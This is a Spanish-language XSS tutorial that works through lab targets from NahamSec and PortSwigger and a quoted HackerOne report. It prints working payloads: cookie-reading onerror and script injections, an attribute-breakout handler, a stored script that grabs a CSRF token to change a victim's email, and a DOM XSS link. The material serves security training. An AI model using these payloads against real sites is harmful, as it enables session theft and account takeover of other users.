![image](https://user-images.githubusercontent.com/88755387/136074041-7872112e-6a49-496d-a959-987fdfc14e1e.png)

- [__¿Qué es?__](#¿Qué-es?)
- [__Impacto__](#Impacto)
- [__Tipos de XSS__](#Tipos-de-XSS)
    - [__Reflected XSS__](#Reflected-XSS)
        - [__Primer ejemplo__](#Primer-ejemplo)
        - [__Segundo ejemplo__](#Segundo-ejemplo)
    - [__Stored XSS__](#Stored-XSS)
    - [__DOM XSS__](#DOM-XSS)

# __¿Qué es?__

El ataque XSS (Cross-site scripting) permite a un atacante ejecutar código arbitrario client-side en el navegador de una víctima. Se puede utilizar para phishing, datos de exfilación, adquisición de cuentas y más.

# __Impacto__

Leer/modificar/eliminar contenido de cualquier página, robar cookies o sesiones de un usuario y obtener acceso a su cuenta, ofrecer contenido malicioso como phishing.

# __Tipos de XSS__

- Reflected XSS 

- Stored XSS: almacena el payload en la base de datos.

- DOM XSS

## __Reflected XSS__

En este caso voy a estar practicando en un laboratorio creado por NahamSec el cual podeis descargarlo en el siguiente enlace. 

[Lab de Nahamsec](https://github.com/nahamsec/nahamsec.training)

Lo primero con lo que nos encontramos es con un formulario que nos está pidiendo nuestro nombre. Si lanzamos el siguiente comando vamos a estar realizando un secuestro de cookie.


![](https://cdn.discordapp.com/attachments/866283809338818580/874823906328981524/si.png)

En este caso concreto no existe ningún tipo de cookie en la página.

![](https://gblobscdn.gitbook.com/assets%2F-MbL5rnDUc5SOFMrCAb3%2F-Mge7kJbQOyG68ts3cY5%2F-MgeJ-Ug2n3znolYFg9G%2Fimage.png?alt=media&amp;token=32f699c9-ba14-4f1b-989c-0a0368b67da1)
![]()

Podemos observar como primero interpreta el código malicioso y luego nos devuelve el output normal.

![](https://gblobscdn.gitbook.com/assets%2F-MbL5rnDUc5SOFMrCAb3%2F-Mge7kJbQOyG68ts3cY5%2F-MgeJGewZ_3gsBMvxsrt%2Fimage.png?alt=media&amp;token=01bd6c53-4700-4331-83c3-252ec6268e8d)

```xml
test1"><script>alert()</script>
</title><u> h4ns </u> <script>alert(1)</script>
```
Si tenemos un parámetro vulnerable como es en este caso `name` podríamos aprovecharnos y poner nuestro nombre cerrándolo con una `'` para luego decirle a la aplicación que ejecute todo lo que viene a continuación y descarte todo lo que está comentado a partir de las `//` .

```bash
http://xss4.naham.sec/?name=h4ns%27;+alert(1);//aaaa
# ' = %27 (URL Encode)
```
Aquí veriamos el ejemplo:

![](https://gblobscdn.gitbook.com/assets%2F-MbL5rnDUc5SOFMrCAb3%2F-Mge7kJbQOyG68ts3cY5%2F-MgeLFzinC6HPLxgP0RB%2Fimage.png?alt=media&amp;token=57d97055-638b-40aa-bb88-e2ba6141fcfe)

### __Primer ejemplo__

Una parte de los laboratorios de Nahamsec me pareció super interesante, vamos a echarle un vistazo:

Estamos en la pagina principal de la tienda https://nahamstore.thm y vamos a enviar un directorio invalido como por ejemplo https://nahamstore.thm/h4ns a ver que nos dice la página.

![](https://gblobscdn.gitbook.com/assets%2F-MbL5rnDUc5SOFMrCAb3%2F-MglrsJ1XV3chCKmZMSC%2F-MglsgGiYwktcwhyyPmS%2Fimage.png?alt=media&amp;token=3d3c9a66-b9d9-422a-bbf8-b764559e749d)

Ajá lo URL encodea. Vamos a probar a añadirle un parámetro aleatorio como por ejemplo file a ver cual es su respuesta.

```
http://nahamstore.thm/h4ns?file=xss
```

Después de lanzarlo nos damos cuenta que cualquier cosa que pongamos en la barra de búsqueda, si no es encontrado, es reflejado en el cuerpo de la página.

Vamos a añadirle a nuestra petición el tag `<h1>` a ver que nos devuelve la página:

```
http://nahamstore.thm/h4ns?file=<h1>xss
```

![](https://gblobscdn.gitbook.com/assets%2F-MbL5rnDUc5SOFMrCAb3%2F-MglrsJ1XV3chCKmZMSC%2F-Mgm0HxBXKQo_KevndPO%2Fimage.png?alt=media&amp;token=c99ccc61-b55c-4295-88b5-b0a471079138)

Perfecto, ya tenemos vía libre para robar unas cookies por ejemplo.

```
http://nahamstore.thm/h4ns?file=<img src=x onerror=alert(document.cookie)>
```
Lo que estamos haciendo en este código de javascript es pedir que nos cargue una imagen llamada `x` pero como esta no existe pues nos va a ejecutar el `alert()`. Esto se produce gracias al parámetro `onerror`.

### __Segundo ejemplo__

En este caso nos vamos a dirigir a uno de los productos que están disponibles para comprar en la tienda, en concreto el de las pegatinas. 

![](https://gblobscdn.gitbook.com/assets%2F-MbL5rnDUc5SOFMrCAb3%2F-MgmClfVhwoT8u8ZRKoE%2F-MgmFI8Jkzv_WorlBicz%2Fimage.png?alt=media&amp;token=5be4d9ac-9c49-42f9-a5a0-f4fea001ade6)

Vamos a abrir el Burp para ver como viaja esta petición:

![](https://gblobscdn.gitbook.com/assets%2F-MbL5rnDUc5SOFMrCAb3%2F-MgmFTP6qsMFnnr07dsY%2F-MgmH4eZcU800oWuPwYc%2Fimage.png?alt=media&amp;token=e7a814df-15be-427d-b671-9caeb2f0a1f9)

En seguida nos damos cuenta que hay un parámetro llamado `discount` pero, como podriamos hacer llegar un xss ahí?

Mandamos la petición al Repeater y le damos a `Follow redirect`, lo que vamos a hacer a continuación es lo que muchas páginas webs hacen y es meter un parámetro en la URL de la petición GET. En este caso vamos a introducir `discount`.

Si le mandamos el payload clásico para ver si pasa algo...

![](https://gblobscdn.gitbook.com/assets%2F-MbL5rnDUc5SOFMrCAb3%2F-MgmOGmwv-uSTpxS5kIf%2F-MgmXgeGhsDYIN0x--1v%2Fimage.png?alt=media&amp;token=d8c356fd-f959-498f-9f2c-1b12c6486765)

y vemos el resultado en la respuesta del servidor...

![](https://gblobscdn.gitbook.com/assets%2F-MbL5rnDUc5SOFMrCAb3%2F-MgmOGmwv-uSTpxS5kIf%2F-MgmXuFvJduTgx_rngeE%2Fimage.png?alt=media&amp;token=758eac22-ff65-4e4f-94e9-05f37a61a176)

nos vamos a dar cuenta que nos han eliminado los caracteres `<>`.

Por lo tanto vamos a eliminarlos de nuestro payload y a crear uno nuevo el cual al pasar el ratón por encima del input nos salte una alerta.

```
http://nahamstore.thm/product?id=2&added=1&discount=11" onmouseover=alert(1);"
```

Podemos verificar que esto se va a ejecutar correctamente si miramos la respuesta:

![](https://gblobscdn.gitbook.com/assets%2F-MbL5rnDUc5SOFMrCAb3%2F-Mgmbv-yMZVbZwCO2LtH%2F-MgmcISZI4kEGHcCJNzr%2Fimage.png?alt=media&amp;token=31fe1f44-c082-43d5-925d-c019570c9a19)

Al final del payload podríamos poner `"` para cerrar comillas o `//` para hacer que esta última se convirtiese en un comentario.

## __Stored XSS__

Estos casos son un poco más complicados debido a su complejidad. Podríamos aprovecharnos de esta vulnerabilidad para realizar un CSRF, vamos a ver un ejemplo. 

Esta vez voy a estar operando en la plataforma de PortSwigger.

[XSS to CSRF](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)

Si miramos el código de la página vamos a observar que tenemos que hacer una solicitud POST a la dirección `/my-account/change-email` . También nos damos cuenta de que existe un anti-CSRF token en un input oculto llamado `token`.

Ahora ya podemos montar nuestro payload el cual deberá cargar la página de la cuenta de usuario, extraer el token CSRF y luego usar el token para cambiar la dirección de correo electrónico de la víctima.

Lo escribimos en algún blog que tenga los comentarios activados y...

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=h4ns@test.com')
};
</script>
```

 Esto hará que cualquier persona que vea el comentario emita una solicitud POST para cambiar su dirección de correo electrónico a h4ns@test.com.

 ## __DOM XSS__

 DOM XSS ocurre cuando javascript refleja datos de un recurso controlado por un atacante (por ejemplo, dentro de la URL) y los pasa a una función más adelante.

Vamos a observar algún ejemplo:

[Reporte de hackerone](https://hackerone.com/reports/324303)

Este tipo de XSS es mucho mas complicado que los anteriores y es necesario tener conocimientos a cerca de javascript y HTML.

La persona que reportó esta vulnerabilidad nos cuenta como a partir del siguiente código interpeta que está buscando una localización para cargar una página en particular dentro de esa web.

![](https://gblobscdn.gitbook.com/assets%2F-MbL5rnDUc5SOFMrCAb3%2F-MgeWoqfWUGTPcqYhp8V%2F-MgeYUWdJwE1INxoBHj1%2Fimage.png?alt=media&amp;token=e1fce6b9-904d-422e-860a-5a16a9f464ae)

Un atacante puede poner su payload en el enlace y se incrustará en el output de la página:

```
https://mycrypto.com/#send-transaction<div/class="header__wrap"><a/href=javascript:alert(0)><h1>pwn3d</h1></a><img/src=//unskid.me/dist/jesus.gif></div>
```

Aquí tendríamos el resultado:

![](https://gblobscdn.gitbook.com/assets%2F-MbL5rnDUc5SOFMrCAb3%2F-MgeWoqfWUGTPcqYhp8V%2F-MgeZ5ESHG-WrSmxRdIV%2Fimage.png?alt=media&amp;token=6d18cbbb-4311-424a-b803-7c860b7fd82a)

En concreto sería este tipo de evento el que se está vulnerando:

[Location href Property](https://www.w3schools.com/jsref/prop_loc_href.asp)
